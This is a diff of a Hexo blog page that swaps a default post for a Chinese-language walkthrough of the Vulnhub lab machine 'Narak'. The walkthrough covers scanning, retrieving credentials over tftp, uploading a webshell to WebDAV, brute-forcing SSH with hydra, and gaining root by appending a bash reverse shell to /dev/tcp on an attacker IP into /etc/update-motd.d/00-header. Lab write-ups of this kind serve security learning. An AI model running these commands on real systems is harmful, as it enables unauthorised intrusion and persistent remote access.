@@ -19,21 +19,43 @@
   <meta name="author" content="m0nst3rer">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="arp-scan -l探测到192.168.182.152为靶机地址 分别使用sudo nmap -sT --min-rate&#x3D;10000 192.168.182.152，sudo nmap -sC -sV -O -Pn -n -p22,80 192.168.182.152，sudo nmap --script&#x3D;vuln -Pn -n 192.168.182.152三条命令进行端口扫描，漏洞脚本扫">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="https://m0nst3rer.github.io/2026/01/17/hello-world/index.html">
+<meta property="og:title" content="Narak">
+<meta property="og:url" content="https://m0nst3rer.github.io/2025/01/18/Narak/index.html">
 <meta property="og:site_name" content="m0nst3rer&#39;Blog">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="arp-scan -l探测到192.168.182.152为靶机地址 分别使用sudo nmap -sT --min-rate&#x3D;10000 192.168.182.152，sudo nmap -sC -sV -O -Pn -n -p22,80 192.168.182.152，sudo nmap --script&#x3D;vuln -Pn -n 192.168.182.152三条命令进行端口扫描，漏洞脚本扫">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2026-01-17T12:08:20.108Z">
-<meta property="article:modified_time" content="2026-01-18T05:33:55.995Z">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118230332726.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118230724101.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118230849488.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118230925495.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118231307313.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118231404142.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118231447762.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118231630157.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118231809680.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118231908956.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118232027978.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118232206609.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118232528767.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118232600453.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118232858970.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118232921359.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118233157462.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118233310765.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118234121930.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118234145847.png">
+<meta property="article:published_time" content="2025-01-18T14:58:10.000Z">
+<meta property="article:modified_time" content="2026-01-18T15:46:41.555Z">
 <meta property="article:author" content="m0nst3rer">
+<meta property="article:tag" content="Vulnhub">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://m0nst3rer.github.io/2025/01/18/Narak/image-20260118230332726.png">
   
   
   
-  <title>Hello World - m0nst3rer&#39;Blog</title>
+  <title>Narak - m0nst3rer&#39;Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +225,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hello World"></span>
+            <span id="subtitle" data-typed-text="Narak"></span>
           
         </div>
 
@@ -214,8 +236,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-01-17 20:08" pubdate>
-          2026年1月17日 晚上
+        <time datetime="2025-01-18 22:58" pubdate>
+          2025年1月18日 晚上
         </time>
       </span>
     
@@ -226,7 +248,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          18 字
+          730 字
         
       </span>
     
@@ -237,7 +259,7 @@
         
         
         
-          1 分钟
+          7 分钟
         
       </span>
     
@@ -274,24 +296,56 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Hello World</h1>
+            <h1 id="seo-header">Narak</h1>
             
             
               <div class="markdown-body">
                 
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
+                <p><code>arp-scan -l</code>探测到<code>192.168.182.152</code>为靶机地址</p>
+<p>分别使用<code>sudo nmap -sT --min-rate=10000 192.168.182.152</code>，<code>sudo nmap -sC -sV -O -Pn -n -p22,80 192.168.182.152</code>，<code>sudo nmap --script=vuln -Pn -n 192.168.182.152</code>三条命令进行端口扫描，漏洞脚本扫描和详细信息扫描</p>
+<p><img src="/2025/01/18/Narak/image-20260118230332726.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用<code>sudo nmap -sU --top-ports 20 192.168.182.152</code>对使用频率最高的20个端口进行UDP扫描，发现开放了<code>tftp</code>服务，先做好记录万一后面用得上。继续进行常规目录扫描<code>sudo dirb http://192.168.182.152</code></p>
+<p><img src="/2025/01/18/Narak/image-20260118230724101.png" srcset="/img/loading.gif" lazyload></p>
+<p>结果有点少，但是<code>webdav</code>和<code>images</code>是比较感兴趣的，换<code>gobuster</code>继续进行扫描</p>
+<p><img src="/2025/01/18/Narak/image-20260118230849488.png" srcset="/img/loading.gif" lazyload></p>
+<p>这次扫出了一个<code>tips.txt</code>文件，打开看看</p>
+<p><img src="/2025/01/18/Narak/image-20260118230925495.png" srcset="/img/loading.gif" lazyload></p>
+<p>意思说是想要打开narak的大门提示藏在<code>creds.txt</code>文件中，刚刚添加了<code>.txt</code>文件后缀进行扫描却没有扫出这个<code>creds.txt</code>，那先看看其他目录扫描结果</p>
+<p><img src="/2025/01/18/Narak/image-20260118231307313.png" srcset="/img/loading.gif" lazyload></p>
+<p>80端口，是一些关于印度教的内容，点击以下<code>Do not Click</code>会跳转到以下页面</p>
+<p><img src="/2025/01/18/Narak/image-20260118231404142.png" srcset="/img/loading.gif" lazyload></p>
+<p>一篇漫画，再去看看<code>/images</code>目录</p>
+<p><img src="/2025/01/18/Narak/image-20260118231447762.png" srcset="/img/loading.gif" lazyload></p>
+<p>都是一些关于印度教中的神的图片，去看看<code>/webdav</code>目录，发现需要进行登录，目前还没有找到相关登录凭证</p>
+<p><img src="/2025/01/18/Narak/image-20260118231630157.png" srcset="/img/loading.gif" lazyload></p>
+<p>没头绪了，返回一开始的<code>tftp</code>，果然有戏，结合<code>creds.txt</code>提示直接get下来</p>
+<p><img src="/2025/01/18/Narak/image-20260118231809680.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看<code>creds.txt</code>里的内容，一眼base64加密，那么直接echo出来并解密就行</p>
+<p><img src="/2025/01/18/Narak/image-20260118231908956.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到一个凭据，尝试登录ssh失败，那应该是webdav的登录凭据了，尝试登录webdav成功</p>
+<p><img src="/2025/01/18/Narak/image-20260118232027978.png" srcset="/img/loading.gif" lazyload></p>
+<p>再利用<code>devtest</code>检测一下它能干嘛</p>
+<p><code>davtest -url http://192.168.182.152/webdav -auth yamdoot:Swarg</code></p>
+<p><img src="/2025/01/18/Narak/image-20260118232206609.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到能使用PUT请求进行文件上传操作，那么大致思路就是传个一句话木马上去进行getshell，利用<code>cadaver</code>工具进行上传，<code>cadaver http://192.168.182.152/webdav</code>，输入登录凭证后<code>put shell.php</code>即可</p>
+<p><img src="/2025/01/18/Narak/image-20260118232528767.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后kali那边进行监听即可收到shell</p>
+<p><img src="/2025/01/18/Narak/image-20260118232600453.png" srcset="/img/loading.gif" lazyload></p>
+<p>后续就是进行提权，发现了一个名为<code>hell.sh</code>以及<code>motd</code>(Message of the day)文件，先看<code>hell.sh</code>文件内容，发现是<code>BrainFuck</code>加密</p>
+<p><img src="/2025/01/18/Narak/image-20260118232858970.png" srcset="/img/loading.gif" lazyload></p>
+<p>拿去在线解密，得到一个像用户名又像密码的凭据：<code>chitragupt</code></p>
+<p><img src="/2025/01/18/Narak/image-20260118232921359.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据刚刚得到的三个用户名，对其进行组合成一个字典然后使用<code>hydra</code>（九头蛇）进行ssh账户爆破</p>
+<p><img src="/2025/01/18/Narak/image-20260118233157462.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到正确登录凭据：<code>inferno:chitragupt</code>，尝试登录成功</p>
+<p><img src="/2025/01/18/Narak/image-20260118233310765.png" srcset="/img/loading.gif" lazyload></p>
+<p>先去&#x2F;etc&#x2F;update-motd.d目录，往<code>00-header</code>文件中写入提权逻辑<code>echo -e &quot;bash -c \&quot;bash -i &gt; &amp; /dev/tcp/192.168.182.155/4435 0&gt;&amp;1\&quot;&quot; &gt;&gt; 00-header</code></p>
+<p><img src="/2025/01/18/Narak/image-20260118234121930.png" srcset="/img/loading.gif" lazyload></p>
+<p>kali进行监听即可收到shell</p>
+<p><img src="/2025/01/18/Narak/image-20260118234145847.png" srcset="/img/loading.gif" lazyload></p>
+<h3>总结</h3>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>前期利用<code>nmap、dirb、gobuster</code>工具进行端口扫描和目扫描；在tftp服务中拿到<code>creds.txt</code>中的<code>webdav</code>登录凭证信息；利用<code>cadaver</code>工具进行PUT传木马上去获得立足点；<code>hell.sh</code>解密拿到ssh登录凭证；组合用户名和密码爆破ssh；写入00-header提权逻辑进行提权获取最终的Flag</p>
 
                 
               </div>
@@ -300,6 +354,34 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Vulnhub/" class="category-chain-item">Vulnhub</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Vulnhub/" class="print-no-link">#Vulnhub</a>
+      
+    </div>
   
 </div>
 
@@ -309,8 +391,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hello World</div>
-      <div>https://m0nst3rer.github.io/2026/01/17/hello-world/</div>
+      <div>Narak</div>
+      <div>https://m0nst3rer.github.io/2025/01/18/Narak/</div>
     </div>
     <div class="license-meta">
       
@@ -322,7 +404,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2026年1月17日</div>
+          <div>2025年1月18日</div>
         </div>
       
       
@@ -354,12 +436,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2026/01/17/hello-world/" title="Hello World">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/01/18/Narak/" title="Narak">
-                        <span class="hidden-mobile">Narak</span>
+                      <a href="/2025/01/18/Momentum2/" title="Momentum2">
+                        <span class="hidden-mobile">Momentum2</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
